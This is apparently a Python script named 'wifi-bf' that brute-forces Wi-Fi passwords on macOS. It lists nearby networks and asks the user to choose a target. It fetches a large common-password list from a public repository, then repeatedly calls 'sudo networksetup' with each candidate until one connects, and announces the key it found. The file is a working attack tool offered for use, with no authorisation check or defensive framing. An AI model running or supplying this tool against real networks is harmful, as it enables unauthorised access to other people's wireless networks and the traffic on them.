import argparse
import subprocess
import os
from ssid_mac import start
import urllib.request
import sys
import time

# service NetworkManager restart -- No need for this on macOS

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def header():
    print('''
==============================================================
	██╗    ██╗██╗███████╗██╗      ██████╗ ███████╗
	██║    ██║██║██╔════╝██║      ██╔══██╗██╔════╝
	██║ █╗ ██║██║█████╗  ██║█████╗██████╔╝█████╗
	██║███╗██║██║██╔══╝  ██║╚════╝██╔══██╗██╔══╝
	╚███╔███╔╝██║██║     ██║      ██████╔╝██║
	 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═╝

                 https://github.com/flancast90
                        added By: shaYaman
==============================================================

    ''')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    VERBOSEGRAY = '\033[170m'


def argument_parser():
    parser = argparse.ArgumentParser(
        prog="wifi-bf",
        description="Brute force wifi password with python 3"
    )

    parser.add_argument(
        '-u', '--url',
        type=str,
        default=None,
        help='The url that contains the list of passwords'
    )
    parser.add_argument(
        '-f', '--file',
        type=str,
        default=None,
        help='The file that contains the list of passwords'
    )

    parser.add_argument(
    	'-v', '--verbose',
    	action='store_true',
    	help='Optional: Use to show all passwords attempted, rather than just the successful one.'
    )

    return parser.parse_args()


def fetch_password_from_url(url):
    try:
        return urllib.request.urlopen(url)
    except:
        return None


def save_passwords_locally(passwords):
    with open('passwords.txt', 'w') as file:
            for password in passwords:
                decoded_line = password.decode("utf-8")
                file.write(decoded_line)


def local_passwords_file_exists():
    return os.path.exists('passwords.txt')


def get_local_passwords():
    with open('passwords.txt', 'r') as file:
        return file.readlines()


def require_root():
    # macOS networksetup command does not always require root, but we'll leave it for consistency.
    # The 'brute_force' function will use sudo, so this check is still good.
    if os.geteuid() != 0:
        print("Run it as root using 'sudo'.")
        sys.exit(-1)

def display_targets(networks, security_type):
    print("Select a target: \n")

    rows, columns = os.popen('stty size', 'r').read().split()
    for i in range(len(networks)):
        width = len(str(str(i+1)+". "+networks[i]+security_type[i]))+2
        spacer = " "

        if (int(columns) >= 100):
            calc = int((int(columns)-int(width))*0.75)
        else:
            calc = int(columns)-int(width)

        for index in range(calc):
            spacer += "."
            if index == (calc-1):
                spacer += " "

        print(str(i+1)+". "+networks[i]+spacer+security_type[i])

def prompt_for_target_choice(max):
    while True:
        try:
            selected = int(input("\nEnter number of target: "))
            if(selected >= 1 and selected <= max):
                return selected - 1
        except Exception as e:
            ignore = e

        print("Invalid choice: Please pick a number between 1 and " + str(max))


def brute_force(selected_network, passwords, args):
    for password in passwords:
        password = password.strip()

        if isinstance(password, str):
            decoded_line = password
        else:
            decoded_line = password.decode("utf-8")

        if args.verbose is True:
            print(bcolors.HEADER+"** TESTING **: with password '" +
                decoded_line+"'"+bcolors.ENDC)

        if (len(decoded_line) >= 8):

            # Use networksetup command for macOS
            commands = [
                "sudo",
                "networksetup",
                "-setairportnetwork",
                "airport",
                decoded_line,
                selected_network
            ]

            try:
                output = subprocess.run(commands, capture_output=True, text=True, check=True)

                # Check for success message from networksetup
                if "Successfully" in output.stdout:
                    sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
                        decoded_line+"' succeeded."+bcolors.ENDC)
                elif args.verbose:
                    print(bcolors.FAIL+"** TESTING **: password '" +
                        decoded_line+"' failed."+bcolors.ENDC)
                    print(f"{bcolors.VERBOSEGRAY}{output.stdout}{bcolors.ENDC}")

            except subprocess.CalledProcessError as e:
                if args.verbose:
                    print(bcolors.FAIL+"** TESTING **: password '" +
                        decoded_line+"' failed."+bcolors.ENDC)
                    print(f"{bcolors.VERBOSEGRAY}{e.stderr}{bcolors.ENDC}")
            except FileNotFoundError:
                print("The 'networksetup' utility was not found. This script is for macOS.")
                break

        else:
            if args.verbose is True:
                print(bcolors.OKCYAN+"** TESTING **: password '" +
                    decoded_line+"' too short, passing."+bcolors.ENDC)

    print(bcolors.FAIL+"** RESULTS **: All passwords failed :("+bcolors.ENDC)


def main():
    cls()
    header()
    # require_root() # The `sudo` command will be used in brute_force, so this is handled there
    args = argument_parser()

    if args.url is not None:
        passwords = fetch_password_from_url(args.url)
    elif args.file is not None:
        try:
            with open(args.file, "r") as file:
                passwords = file.readlines()
                if not passwords:
                    print("Password file cannot be empty!")
                    sys.exit(0)
        except FileNotFoundError:
            print(f"Error: Password file '{args.file}' not found.")
            sys.exit(1)
    else:
        default_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
        passwords = fetch_password_from_url(default_url)
        if passwords:
            save_passwords_locally(passwords=passwords)
            passwords = get_local_passwords()
        elif local_passwords_file_exists():
            passwords = get_local_passwords()
        else:
            sys.exit(bcolors.FAIL+"Fetch failed. Check internet status."+bcolors.ENDC)


    func_call = start(1)
    networks = func_call[0]
    security_type = func_call[1]

    if not networks:
        print("No networks found!")
        sys.exit(-1)

    display_targets(networks, security_type)
    max = len(networks)
    pick = prompt_for_target_choice(max)
    target = networks[pick]

    cls()
    header()

    print("\nWifi-bf is running. If you would like to see passwords being tested in realtime, enable the [--verbose] flag at start.")

    brute_force(target, passwords, args)

if __name__ == "__main__":
    main()
